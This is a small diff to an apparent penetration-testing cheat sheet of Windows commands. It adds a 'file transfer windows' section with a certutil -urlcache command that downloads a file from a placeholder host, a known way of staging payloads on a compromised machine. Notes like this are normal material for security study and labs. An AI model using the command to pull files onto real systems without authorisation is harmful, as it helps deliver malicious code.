@@ -24,6 +24,12 @@ dir                         #ls alternative for windows
 systeminfo
 ```
 
+## file transfer windows
+
+```
+certutil -urlcache -f http://<ip>/<filename> <filename to be saved as>
+```
+
 how to grep
 
 ```
